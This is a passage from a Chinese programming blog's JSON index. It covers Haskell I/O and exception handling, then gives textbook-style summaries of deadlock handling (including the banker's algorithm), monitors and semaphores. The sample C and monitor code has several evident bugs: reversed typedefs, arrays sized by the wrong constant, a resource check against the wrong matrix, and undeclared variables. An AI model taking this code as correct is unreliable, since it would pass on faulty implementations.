正则函数可配合其他函数如 getAllTextMatchs 来获取更多结果： 12ghci&gt; (\"foo buot\" =~ \"(oo|uo)\") :: [String][\"oo\", \"uo\"] 文件系统路径 Haskell 的文件系统处理函数主要由 System.Directory 提供，如 doesDirectoryExist、doesFileExist、getCurrentDirectory、getDirectoryContents 等。 System.FilePath 主要处理文件路径，由两个模块构成：System.FilePath.Posix 和 System.FilePath.Windows，二者接口完全相同，适配平台不同。包含函数如： getSearchPath：获得 $PATH 环境变量内容 &lt;/&gt;：将两个字符串用 / 合为一个路径 &lt;.&gt;：将后缀名结合，等价于 addExtension -&lt;.&gt;：去掉后缀名并添加一个新的后缀名，等价于 replaceExtension dropTrailingPathSeparator：去掉文件路径后的分隔符，如 / splitFileName：返回将路径切割为父级目录和文件名的二元组 常见 I/O 异常处理 异常处理的几个常用函数包含在 Control.Exception 中。 handle :: (Exception -&gt; IO a) -&gt; IO a -&gt; IO a 接收的第一个参数是一个函数，该函数接受一个异常值并且返回 IO Monad，第二个参数是可能抛出异常的 IO Monad。当第二个 IO Monad 执行出现异常时，作为 handle 第一个参数的函数会接收产生的异常值，并返回自己的 IO Monad；当第二个参数执行无异常时， handle 返回值与第二个参数相同。 在 handle 的使用中可使用 const 忽略传入的异常。const 接收两个参数，无论第二个参数是什么都返回第一个参数： 12handle (const (return [])) (code_may_cause_exception)const (return []) :: Monad m =&gt; b -&gt; m [t] 也可以使用 finally 捕获异常，其类型签名为 finally:: IO a-&gt; IO b -&gt; IO a，无论第一个 IO Monad 成功或失败，第二个 IO Monad 都会执行。 bracket 可以看作 Haskell 中的 defer：如果你试图获取一个资源，对该资源做一些操作，并想在操作结束后释放这个资源，则可以使用 bracket 来保证最终资源的释放。bracket 接收三个参数，第一个参数用于资源的获取，它的返回值会传给第二、三个参数，而第二个参数对应资源的释放，第三个参数为对资源的操作，它的返回值也是整个 bracket 函数的返回值。例如： 12345bracket :: IO a -&gt; (a -&gt; IO b) -&gt; (a -&gt; IO c) -&gt; IO cbracket (openFile \"filename\" ReadMode) (hClose) (\\fileHandle -&gt; do &#123; ... &#125;) 当不需要获取第一个参数的返回值时，或这几个操作之间并无关系，使用 bracket_ :: IO a -&gt; IO b -&gt; IO c -&gt; IO c 替代 bracket。 如果仅希望释放操作在执行操作出现异常时调用，则使用 bracketOnError:: IO a -&gt; (a -&gt; IO b) -&gt; (a -&gt; IO c) -&gt; IO c。 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/30/efficient-haskell-io/) 、作者信息（Forec）和本声明。","categories":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}],"tags":[{"name":"Haskell","slug":"Haskell","permalink":"http://forec.github.io/tags/Haskell/"},{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://forec.github.io/tags/函数式编程/"}],"keywords":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}]},{"title":"操作系统（七）：死锁","slug":"os-concepts-7","date":"2016-11-24T14:16:22.000Z","updated":"2017-01-05T15:47:06.000Z","comments":true,"path":"2016/11/24/os-concepts-7/","link":"","permalink":"http://forec.github.io/2016/11/24/os-concepts-7/","excerpt":"整理《Operating System Concepts》 第七版死锁部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版死锁部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 死锁模型 多道程序环境下，多个进程竞争有限资源。如果某个进程需求的资源被其他进程占用，则该进程可能被永久阻塞，这种情况称为 死锁（deadlock） 。 进程按照如下顺序使用资源： 申请（Request） ：如果申请不能被允许（如资源正在被其他进程占用），则申请进程必须等待直到获得资源 使用（Use） 释放（Release） 资源的申请和释放都是系统调用，如设备的 request()/release()，文件的 open()/close()，内存的 allocate()/free() 等。对于进程或线程的每次执行，操作系统会检查并确保它们以获得所需资源。系统维护一张记录表，说明某个资源是否空闲，被分配给哪个进程。 永久性资源可分为： 可剥夺资源（可重用资源）：当进程所占有的并使用的资源被剥夺时，对进程不产生破坏性影响（如内存、CPU） 不可剥夺资源：如打印机等，一旦剥夺则任务执行失败 死锁特征 以下四个条件（四个条件并不完全独立）同时成立时，死锁产生： 互斥（mutual exclusion） ：至少有一个资源处于互斥模式，即该资源同时只能由一个进程使用。 占有并等待（hold and wait） ：进程必须占有至少一个资源，并且等待另一资源，且等待的资源已被其他进程占有。 非抢占（no preemptive） ：资源不能被抢占。 循环等待（circular wait） ：一组等待进程 {P0, p1, ..., pn}，其中 Pi 等待的资源被 Pi+1 占有，Pn 等待的资源被 P0 占有。 死锁问题可用 系统资源分配图（system resource-allocation graph） 描述： 该图的节点集合 V 分为系统活动进程集合 P = {P1, P2, ..., Pn} 和系统资源类型集合 R = {R1, R2, ..., Rm}。 从进程 Pi 到资源类型 Rj 的有向边记为 Pi → Rj，称为 申请边（request edge） ，表示进程 Pi 已经申请并正在等待资源类型 Rj 的一个实例。 从资源类型 Rj 到进程 Pi 的有向边记为 Rj → Pi，称为 分配边（assignment edge） ，表示资源类型 Rj 的一个实例已经分配给进程 Pi。 在图上用圆形表示进程 Pi，用矩形表示资源类型 Rj，资源类型的多个实例在矩形中用圆点表示。 申请边只需指向矩形 Rj，分配边的源点需要指定矩形内部的某个圆点。 当进程 Pi 申请资源类型 Rj 的一个实例时，在资源分配图中加入一条申请边，当该申请可以满足时将该申请边 立即 转换为分配边。当进程释放资源时，该分配边从图中删除。 可证明： 如果分配图中不存在环，则系统未发生进程死锁 如果分配图中存在环且每个资源类型仅有一个实例，则系统已处于进程死锁 如果分配图中存在环，且存在某个资源类型有多个实例，则系统可能处于进程死锁 一个带有死锁的资源分配图如下图所示： 死锁处理 三种方法可以处理死锁： 使用某种协议预防或避免死锁，确保系统不进入死锁状态 允许系统进入死锁状态，且系统可以检测到死锁并恢复 忽视死锁问题，认为系统中不可能发生死锁 多数操作系统采用第三种（包括 UNIX 和 Windows），因此死锁由应用程序员处理。 死锁预防 根据死锁特征，只要破坏四个条件中的一个使之不同时成立即可实现 死锁预防（prevention） 。 破坏互斥：非共享资源必须满足互斥条件，因此此条件无法破坏 破坏占有并等待：必须保证一个进程不能在已经占有其他资源的情况下再申请一个资源，两种方法可选（两种方法 资源利用率均较低 ，且 可能导致饥饿 ，需要多个常用资源的进程可能会永久等待）： 每个进程在执行前申请并获得执行期间所需的全部资源； 仅允许进程在没有资源时才可申请资源，在它申请更多资源前必须释放全部已持有资源。 破坏非抢占：如果一个进程在占有一些资源的同时申请了另一个不能立刻被分配的资源（等待列表中的其他进程也没有持有该资源），则该进程目前已获得的所有资源都可被其它正在等待的进程抢占。也就是说，该进程持有的资源被隐式释放了。该进程要想重新执行，必须分配到要申请的资源，同时还要恢复自己在等待时被抢占的资源。此协议通常用于状态可以保存和恢复的资源，如 CPU 寄存器和内存，对于不可剥夺资源无效。 破坏循环等待：系统定义一个函数 F: R → N 为资源类型集合编号，不同资源类型的编号不同。每个 进程只能按照递增顺序申请资源 ，进程开始执行时可以申请任意数量的资源类型 Ri 的实例，之后若想申请资源类型 Rj 的实例，则必须满足 F(Rj) &gt; F(Ri) 才可申请，否则它必须释放所有编号 大于 F(Rj) 的资源后才能再申请。 证明：若存在循环等待，设循环等待的进程集合为 {P0, P1, ..., Pn} ，其中 Pi 等待资源 Ri，且 Ri 被进程 Pi+1 占有，因为 Pi+1 占有资源 Ri 且申请资源 Ri+1，所以对所有 i 有 F(Ri) &lt; F(Ri+1)，即 F(R0) &lt; F(R1) &lt; ... &lt; F(Rn) &lt; F(R0)，假设不成立。 按照此协议，程序员必须按系统为资源定义的顺序来编写程序才可防止死锁。有些软件（如 Witness）可以验证资源锁是否按顺序获取，并对不按顺序获取的代码做出警告。 以上通过限制资源申请来预防死锁的方法可行，但会降低设备使用率和系统吞吐率。 死锁避免 死锁避免（deadlock-avoidance） 算法动态监测资源分配状态以保证循环等待条件无法成立，同时它要求进程提供一定的 先验信息 ，例如进程执行期间可能需要使用的每种资源类型实例的最大数量。 若系统中的进程按照某个特定顺序执行不会产生死锁，则此时系统处于安全状态，这个进程执行的顺序称为 安全序列（safe sequence） 。 安全状态必然不会导致死锁，不安全状态可能会导致死锁状态，死锁状态必然是不安全状态。 资源分配图算法 ： 适用于每个资源只有一个实例的系统； 向系统资源分配图中加入一种新类型的边，称为 需求边（claim edge） 。需求边 Pi-&gt;Rj 表示进程 Pi 可能在将来某时刻申请资源 Rj，需求边用虚线表示。当 Pi 申请资源 Rj 时，需求边 Pi-&gt;Rj变为申请边，当进程 Pi 释放资源 Rj 时，分配边 Rj-&gt;Pi 变成需求边； 若进程 Pi 试图申请资源 Rj，则系统需要检查：如果需求边 Pi-&gt;Rj 变成分配边 Rj-&gt;Pi 后，资源分配图中不存在环（虚实线无所谓），则允许申请，否则进程 Pi 必须等待。 系统检查是否存在环可使用 Tarjan 等求联通子图的 n² 级算法。 一个资源分配图算法的实例如下图。 银行家（Banker’s）算法 ： 适用于每种资源类型有多个实例的情形，效率低于资源分配图 银行家算法需要在进程请求资源时检查分配后的状态是否保持安全。使用下面的安全性算法可确定系统是否处于安全状态，算法的时间复杂度为 mn²。 银行家算法使用的数据结构： Available：长度为 m 的向量，表示每种资源当前可用的（未被分配给进程的）实例数量 Max：n × m 的矩阵，Max[i][j] 表示进程 Pi 在整个生命周期中需要申请资源类型 Rj 实例的最大数量 Allocation：n × m 矩阵，Allocation[i][j] 表示进程 Pi 当前已经持有（已被分配）的资源类型 Rj 的实例数量；Allocation 的第 i 行记作 Allocation[i,]，表示进程 Pi 当前持有的不同资源类型的数量。 Need：n × m 矩阵，Need[i][j] = Max[i][j] - Allocation[i][j]，表示进程 Pi 还可能申请多少个 Rj 类型的资源实例；Need 的第 i 行记作 Need[i,]，表示进程 Pi 结束前可能仍要申请的不同资源数量 安全性算法 ： 令 Work = Available 为长度为 m 的行向量，表示每种资源当前剩余可用的实例数量；令 Finish=[False for i = 0 to n-1] 为长度为 n 的行向量，初始化全部为 False，表示进程当前是否已结束执行。 寻找一个正在执行的进程 Pi，并且 Need[i,] ≤ Work，即：Finish[i] == False &amp;&amp; Need[i,] ≤ Work，这意味着当前系统剩余资源能够满足 Pi 的全部需求。若不存在这样的进程，则调到第 4 步。 更新 Work = Work + Allocation[i,] ，令 Finish[i] = True 并跳回第 2 步。这意味着进程 Pi 已经执行结束，并且它所持有的资源全部释放，因此系统可用资源数量 Work 增加。注意这一步实际 等价于对资源分配图的化简 ，它将一个可消去的进程（即该进程可以得到资源并执行完）和所有该进程与相关资源连接的边从资源分配图中删去。 检查所有的 i，是否都有 Finish[i] == True，若是则系统处于安全状态，否则系统处于不安全状态。 安全性算法的 C 语言大致表述： 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;memory.h&gt;#include &lt;stdlib.h&gt;#define NUM_PROCESS 20#define NUM_RESOURCE 10#define TRUE 1#define FALSE 0typedef Boolean unsigned int;unsigned int Available[NUM_PROCESS];unsigned int Max[NUM_PROCESS][NUM_RESOURCE];unsigned int Allocation[NUM_PROCESS][NUM_RESOURCE];unsigned int Need[NUM_PROCESS][NUM_RESOURCE];Boolean safe()&#123; Boolean Finish[NUM_PROCESS]; unsigned int Work[NUM_PROCESS]; unsigned int i, j, k; memset(Finish, FALSE, sizeof(Boolean) * NUM_PROCESS); memcpy(Work, Available, sizeof(unsigned int) * NUM_PROCESS); for (k = 0; k &lt; NUM_PROCESS; k++)&#123; for (i = 0; i &lt; NUM_PROCESS; i++)&#123; // 寻找满足条件的 Pi if (Finish[i]) continue; Boolean flag = TRUE; for (j = 0; j &lt; NUM_RESOURCE; j++) if (Need[i][j] &gt; Work[j])&#123; flag = FALSE; break; &#125; if (flag)&#123; // 寻找到进程 Pi 满足条件 for (j = 0; j &lt; NUM_RESOURCE; j++) Work[j] += Allocation[i][j]; Finish[i] = TRUE; break; // 进程 Pi 结束执行 &#125; &#125; &#125; for (k = 0; k &lt; NUM_PROCESS; k++) if (!Finish[k]) return FALSE; return TRUE;&#125; 资源请求算法 ：判断进程对资源的申请是否可以维持安全性。设申请资源的进程为 Pi，Request[i,] 为一个长度为 m 的行向量，表示进程 Pi 要申请的不同资源实例数量。 若 Request[i,] ≤ Need[i,] 则转到第 2 步，否则产生出错条件（进程 Pi 要申请的资源数量超过了它此前声明的可能使用的最大资源数量） 若 Request[i,] ≤ Available 则转第 3 步，否则 Pi 等待（剩余资源不满足 Pi 的请求） 假设系统剩余资源足够 Pi 使用，则系统计算修改后的状态是否安全，若安全则允许修改，不安全则 Pi 必须等待。 资源请求算法的 C 语言大致表述为： 123456789101112131415161718192021222324Boolean allocate(unsigned int i, unsigned int *Request)&#123; unsigned int j; for (j = 0; j &lt; NUM_RESOURCE; j++) if (Request[j] &gt; Need[i][j]) return False; for (j = 0; j &lt; NUM_RESOURCE; j++) if (Request[j] &gt; Allocation[i][j]) wait(); // 进程 Pi 必须等待资源 for (j = 0; j &lt; NUM_RESOURCE; j++)&#123; Available[j] -= Request[j]; Allocation[i][j] += Request[j]; Need[i][j] -= Request[j]; &#125; // 假设可以分配 if (!safe())&#123; // 分配后不安全，恢复状态 for (j = 0; j &lt; NUM_RESOURCE; j++)&#123; Available[j] += Request[j]; Allocation[i][j] -= Request[j]; Need[i][j] += Request[j]; &#125; wait(); &#125; else return TRUE;&#125; 死锁检测 如果一个系统既不采用死锁预防算法，也不采用死锁避免算法，则该系统可能出现死锁。此时，系统应当提供： 检查系统是否出现死锁的算法 从死锁状态中恢复的算法 每个资源类型仅存在一个实例：可以使用资源分配图的变种 等待（wait-for）图 ，该图删去了资源分配图中的资源节点，而将原图中所有 Pi-&gt;Rj-&gt;Pk 的边转化为 Pi-&gt;Pk，即进程 Pi 正在等待进程 Pk 掌握的资源。如果等待图中有环存在，则系统存在死锁。为了检测死锁，系统要维护这个等待图，并且周期性的在图中调用检测算法，该算法时间复杂度为 n²，n 为系统中进程数。 每种资源类型存在多个实例：算法与银行家算法类似，仍采用 Available，Allocation 和 Request 三个变量保存系统状态，其中此处的 Request 是一个 n × m 的矩阵，Request[i][j] 表示进程 Pi 当前正在申请的资源类型 Rj 的数量。 死锁检测算法 ，时间复杂度为 mn²： 令 Work = Available 为长度为 m 的行向量，表示每种资源当前剩余可用的实例数量；令 Finish 为长度为 n 的行向量，若进程 Pi 当前未持有任何资源（Allocation[i,] == 0）则 Finish[i] = True，否则 Finish[i] = False。这里将不持有资源的进程设置 Finish 为 True 是因为，不持有资源的进程不会对死锁产生影响，不会有其它进程在等待该进程，这实际 等价于等待图中的孤立点 。 寻找一个正在执行的进程 Pi，并且 Request[i,] ≤ Work，即：Finish[i] == False &amp;&amp; Request[i,] ≤ Work，这意味着当前系统剩余资源能够满足 Pi 此刻的需求。若不存在这样的进程，则调到第 4 步。 更新 Work = Work + Allocation[i,] 且令 Finish[i] = True；跳回第 2 步。 检查是否存在某个 i 有 Finish[i] == False，若存在则系统处于死锁状态，且进程 Pi 死锁。 注意上面的死锁检测算法的第 2 步：如果 Request[i,] ≤ Work 就回收进程 Pi 的资源。这是基于如下假定，如果 Pi 不会参与到死锁中（因为 Request[i,] ≤ Work，Pi的需求可以被满足所以此时一定不会被死锁），则 乐观地认为 Pi 直到执行结束都不会再申请更多的资源 。这里的假定可能不正确，如果假定不正确，Pi 在之后又申请了更多的资源，则在系统下次运行死锁检测算法时仍然会发现，所以这里的假定不影响算法正确性。 调用检测算法的频率 受如下两个因素影响： 死锁可能发生的概率多少：如果经常发生死锁则应该经常调用检测算法 死锁发生时有多少进程会受影响 考虑极端情况：每当出现进程请求资源不能被立刻允许的情况时就调用死锁检测算法，则系统不仅能确定哪些进程处于死锁，还能确定导致死锁的特定进程（实际上是死锁环上的每个节点共同导致了死锁）。此种方式会导致巨大的计算开销。但如果使用较低的频率调用检测算法，或当 CPU 使用率低于某个阈值时，则调用检测算法无法确定涉及死锁的进程中是哪些导致了死锁。 死锁恢复进程终止 两种方法通过终止进程来取消死锁，被终止的进程所持有的所有资源都会被系统回收： 终止所有死锁进程 ：代价较大，有些进程可能已经运行很长时间而不得不放弃 每次终止一个进程，直到死锁状态取消 ：开销较大，每终止一个进程都需要重新调用死锁检测算法 当采用部分终止时，确定终止哪个进程/哪个进程可以打破死锁的因素涉及： 进程优先级 进程已运行的时间和完成任务所需要的剩余时间 进程使用了哪些、多少资源，以及资源是否可抢占 进程仍需多少资源 有多少进程需要被终止 交互进程还是批处理进程 资源抢占 死锁的恢复也可以通过抢占资源来逐步取消死锁状态，需要处理三个问题： 选择被抢占对象（victim） ：抢占哪些进程和资源，这和死锁恢复中部分终止要考虑的因素类似。 回滚（rollback） ：如果从某个进程抢占资源，则被抢占的进程需要回滚到某个安全状态以便之后重新执行。完全回滚（终止被抢占的进程并重启该进程）比较容易，更有效的方式是将进程回滚到足够打破死锁的状态，但这需要系统维护更多关于进程状态的信息。 饥饿 ：如何确保不会总从同一个进程抢占资源。通常会考虑回滚次数，确保一个进程只能被抢占有限次。 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（六）：管程（Monitor）此专栏的下一篇文章：操作系统（八）：内存管理 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/24/os-concepts-7/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（六）：管程（Monitor）","slug":"os-concepts-6","date":"2016-11-24T12:47:03.000Z","updated":"2017-01-06T12:34:52.000Z","comments":true,"path":"2016/11/24/os-concepts-6/","link":"","permalink":"http://forec.github.io/2016/11/24/os-concepts-6/","excerpt":"整理《Operating System Concepts》 第七版第六章 Monitor 部分的理论和概念，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版第六章 Monitor 部分的理论和概念，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 信号量提供了方便的机制处理进程同步，但不正确的使用信号量仍会导致时序错误，且难以检测。如： 先对信号量 signal() 再 wait() 违反了互斥请求 对信号量始终调用 wait() 将导致死锁 一个进程遗漏了 wait() 或 signal() 将导致死锁且可能破坏互斥 管程（monitor） 类型提供了一组由程序员定义的、在管程内互斥的操作。管程内定义的子程序只能访问位于管程内的局部变量和形式参数，管程内的局部变量也只能被管程内部的局部子程序访问。 管程结构确保了同时只能有一个进程在管程内活动 。 管程内部可定义 condition 类型的变量以提供同步机制，称其为条件变量。条件变量可执行操作 wait() 和 signal()。 我个人对条件变量的理解和信号量类似： 条件变量存在于管程内部，对同一个条件变量调用操作的进程将和条件变量建立一定的联系，或者称之为绑定。对于管程内的条件变量 x，进程 P 调用 x.wait() 将时自身挂起到条件变量 x 上；当另一个进程调用 x.signal()时，在 x 上悬挂的进程会被重启，如果此时没有进程悬挂在 x 上，则 x.signal() 操作将被忽略。 管程模式下的 x.signal() 和信号量的 signal() 区别在于： 信号量操作 signal() 会影响信号量的状态 ，而管程下的 x.signal() 在 x 不存在挂起进程的情况下没有任何影响。 举例：进程 P 调用 x.signal()，且存在悬挂进程 Q 与条件变量 x 关联。根据管程的性质，若进程 Q 开始执行，则进程 P 必须等待。此时可能存在两种可能性，且两种可能性均有合理解释： 进程 Q 重启且进程 P 等待：进程 P 将等待，直到进程 Q 离开管程或者等待另一个进程调用 x.signal() 进程 P 唤醒进程 Q 且进程 P 继续执行：进程 Q 被唤醒，但仍然会等待，直到进程 P 离开管程，或者另一个触发条件。因为 P 已经在管程中执行，看起来此种方案更合理，但这破坏了进程 Q 正在等待的逻辑条件，进程 Q 已被触发但又未执行，因此状态难以描述 Pascal 语言采用折中方式，当进程 P 执行 x.signal() 时，它会立刻离开管程，且进程 Q 会立刻重新执行 哲学家进餐问题的管程解法 使用 进程同步 中的一种策略：当哲学家在两只筷子均可用的情况下才拿起筷子，且拿起两只筷子的动作是非抢占的。 为哲学家设置三种状态：enum {THINKING, HUNGRY, EATING} state[5] 哲学家 i 只有在两个邻居都不进餐时才能将变量 state[i] 设置为 EATING，当他处在饥饿状态又无法进餐时可以使自己忍耐一段时间：(state[(i-1)%5] != EATING) &amp;&amp; (state[(i+1)%5] != EATING) 下面给出用管程解决的哲学家进餐问题，只解决了互斥问题，不会导致死锁，但可能导致某个哲学家过度饥饿而死。 12345678910111213141516171819202122232425monitor dp&#123; enum &#123;THINKING, HUNGRY, EATING&#125; state[5]; condition self[5]; void pickup(int i)&#123; state[i] = HUNGRY; test(i); if (state[i] != EATING) self[i].wait(); &#125; void putdown(int i)&#123; state[i] = THINKING; test((i-1) % 5); test((i+1) % 5); &#125; void test(int i)&#123; if ((state[(i-1)%5] != EATING) &amp;&amp; (state[(i+1)%5] != EATING))&#123; state[i] = EATING; self[i].signal(); &#125; &#125; initialization_code()&#123; for (int i = 0; i &lt; 5; i++) state[i] = THINKING; &#125;&#125; 一个改进版的 Monitor 解决方案如下。筷子本身并不属于 monitor 的一部分，否则同时只能有一个哲学家在进餐。代码中 NUM_PHILS 是哲学家数目。此代码解决了哲学家饥饿问题，来自西弗吉尼亚大学。 1234567891011121314151617181920212223242526272829303132monitor dp&#123; condition self[NUM_PHILS]; enum states &#123;THINKING, HUNGRY, EATING&#125; state[NUM_PHILS-1]; int index; initialization_code()&#123; for (index=0; index&lt;NUM_PHILS; index++) flags[index] = THINKING; &#125; void pickup(int i) &#123; state[i] = HUNGRY; if ((state[(i-1)%NUM_PHILS] != EATING) &amp;&amp; (state[(i+1)%NUM_PHILS] != EATING)) state[i] = EATING; else &#123; // 挂起，等待相邻哲学家改变状态时唤醒 self[i].wait; // wait 操作被唤醒后可以改变状态为 EATING state[i] = EATING; &#125; &#125; void putdown(int i) &#123; state[i] = THINKING; // 唤醒左侧哲学家 if ((state [(i-1)%NUM_PHILS] == HUNGRY) &amp;&amp; (state [(i-2)%NUM_PHILS] != EATING)) self[(i-1)%NUM_PHILS].signal; // 唤醒右侧哲学家 if ((state [(i+1)%NUM_PHILS] == HUNGRY) &amp;&amp; (state [(i+2)%NUM_PHILS] != EATING)) self[(i+1)%NUM_PHILS].signal; &#125;&#125; 使用信号量实现管程 要实现的管程对于重启进程采用的策略是： 调用 x.signal() 的进程挂起自己，直到重新启动的进程离开或者等待 。 每个管程都有一个信号量 mutex 初始化为 1，进程进入管程之前必须通过 wait() 获得允许，离开时需要调用 signal() 释放权限。 信号量 next 初始化为 0，供线程在唤醒重启进程时挂起自己，整数变量 next_count 用于对挂起在 next 上的进程数量计数。 进入管程的外部子程序结构 F 如下： 12345678910void F()&#123; wait(mutex); // 子程序执行 // ... // 子程序执行结束 if (next_count &gt; 0) signal(next); // 此前有进程挂起，重启该进程 else signal(mutex); // 管程内无进程挂起，释放控制权&#125; 对每个管程内的条件变量 x，引入信号量 x_sem 和整数变量 x_count 记录信号量 x 上挂起的进程数量，均初始化为 0。x.wait() 和 x.signal() 实现如下： 12345678910111213141516171819void x.wait()&#123; x_count++; // 将进程挂起到 x 上 if (next_count &gt; 0) // 当前仍有进程挂起在管程中 signal(next); else signal(mutex); // 无进程在等待，释放管程控制权 wait(x_sem); // 等待信号量 x_sem，由信号量决定唤醒哪个挂起进程 x_count--; // 等待结束，进程被唤醒&#125;void x.signal()&#123; if (x_count &gt; 0)&#123; // 当前有程序挂起在条件变量 x next_count ++; // 自己将要被阻塞，故管程挂起数增加 signal(x_sem); // 释放信号量，唤醒一个挂起进程 wait(next); // 将自身阻塞到管程中 next_count--; // 被唤醒，继续执行 &#125; // 没有程序挂起在条件变量 x，不产生任何影响&#125; 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（五）：进程同步此专栏的下一篇文章：操作系统（七）：死锁 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/24/os-concepts-6/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（五）：进程同步","slug":"os-concepts-5","date":"2016-11-24T10:41:33.000Z","updated":"2017-01-05T04:56:48.000Z","comments":true,"path":"2016/11/24/os-concepts-5/","link":"","permalink":"http://forec.github.io/2016/11/24/os-concepts-5/","excerpt":"整理《Operating System Concepts》 第七版第六章进程同步部分的理论和概念，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版第六章进程同步部分的理论和概念，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 信号量 基于硬件的 TestAndSet() 和 Swap() 对应用程序员而言相对复杂，可使用 信号量（semaphore） 作为同步工具。信号量 S 是整数变量，除初始化外只能通过两个原子操作访问：wait() 和 signal()，在有些地方使用 P（测试） 和 V（增加）表示。所有关于信号量的讨论均已具备以下前提：在这两个原子访问操作中，对信号量整型值的测试和修改都是不可分的，也就是说，当一个进程修改某个信号量时，其他进程都不能同时操作该信号量。 信号量按值域可分为 计数信号量（counting semaphore） ：信号量值域不受限制。此类信号量用于控制访问具有若干个实例的某类资源，初始化信号量为可用资源的数量，进程通过调用 wait() 操作获取资源（此时信号量计数也随之减少），进程使用资源后通过 signal() 操作释放资源（信号量计数随之增加）。当信号量的值小于等于 0 时，所有调用 wait() 操作的进程会被阻塞，直到某个进程调用了 signal() 释放了可用资源。 二进制信号量（binary semaphore） ：信号量的值只能为 0 或者 1，该类信号量也称为 互斥锁（mutex locks） ，可提供互斥操作。对于多进程的临界区问题，可以使所有进程共享一个二进制信号量 mutex，每个进程进入临界区之前调用 waiting(mutex) ，离开临界区之前调用 signal(mutex)。 信号量按功能可分： 公有（互斥）信号量：多个进程均需要同一个信号量所代表的资源，信号量起到了互斥的作用 私有（同步）信号量：部分进程向信号量释放资源，其他进程向信号量请求资源，信号量起到了同步的作用，保证了进程之间执行的先后顺序 实现 信号量的主要缺点是 忙等待（busy waiting） ，当一个进程位于临界区内时，其它试图进入临界区的进程都陷入循环检查的状态。这样的信号量也称为 旋转锁（spinlock） ，它也具有优点：进程在等待锁时不会进行上下文切换（上下文切换可能会花费很长的时间），因此如果等待锁的时间较短则旋转锁更有效。旋转锁通常用于多处理器系统，一个线程在某个处理器旋转时，另一个线程在另一个处理器的临界区内执行。 修改 wait() 和 signal()： 进程执行 wait() 时若信号量值不为正则调用 block() 操作将其阻塞，阻塞操作包括：将该进程状态切换为等待，将该进程放到信号量内部的一个等待队列中。之后 CPU 调度程序选择另一个进程执行。 进程执行 signal() 操作后，信号量值会增加。同时若存在进程阻塞在信号量上，则操作系统从信号量内部等待队列中选取一个进程，调用 wakeup() 操作将其唤醒，唤醒操作包括：将该进程从等待状态切换到就绪状态、放入就绪队列中（根据 CPU 调度算法，CPU 不一定会选择这个线程立刻执行）。 信号量的 wait() 和 signal() 操作可定义如下，每个信号量包括一个整型值和一个 PCB 链表指针，使用 FIFO 队列可确保有限等待，但一般来说链表可以使用任何排队策略，信号量的使用方式和链表排队策略无关： 1234567891011121314151617181920typedef struct&#123; int value; struct process *list; // PCB 块链表指针&#125; semaphore;void wait(semaphore *S)&#123; S-&gt;value--; if (S-&gt;value &lt; 0)&#123; // 无可用资源，将进程加入信号量等待列表 block(); &#125;&#125;void signal(semaphore *S)&#123; S-&gt;value++; if (S-&gt;value &lt;= 0)&#123; // 从信号量等待列表中选取一个进程唤醒 wakeup(P); &#125;&#125; 信号量的 关键在于它们的执行具有原子性 。在单处理器上，可在调用 wait() 和 signal() 时禁止中断，而在多处理器系统上，仍需要使用其它加锁计数（如旋转锁）来确保信号量的原子性，因此信号量本身的实现还是没有完全取消忙等，仅仅是 把忙等的状态从等待进入临界区转移到了临界区执行时 ，因为经过合理设计的临界区通常比较短，因此比简单的忙等效率高一些。但在临界区很长的情况下，因为采用了忙等，导致信号量极为低效。 死锁和饥饿 当两个或多个进程无限等待一个事件，而该事件只能由等待该事件的某个进程来触发（执行 signal 操作），这种情况下，这些进程称为 死锁（deadlocked） 。 链表的出入顺序对信号量有影响，如果采用 LIFO 顺序增加、取出进程，则可能导致 无穷阻塞（indefinite blocking） 或 饥饿（starvation） 。 经典同步问题有限缓冲问题 进程互斥 中的生产者-消费者问题可以通过三个信号量解决： 二进制信号量 mutex 保证了对缓冲池访问的互斥 计数信号量 empty 和 full 表示缓冲区中空余数量和已有数据数量 生产者和消费者进程使用如下架构保证互斥和同步： 123456789101112131415161718// producerdo &#123; // produce an item wait(empty); wait(mutex); // put item into buffer signal(mutex); signal(full);&#125; while(TRUE);// consumerdo &#123; wait(full); wait(mutex); // remove an item from buffer signal(mutex); signal(empty);&#125; while(TRUE); 读者-写者问题 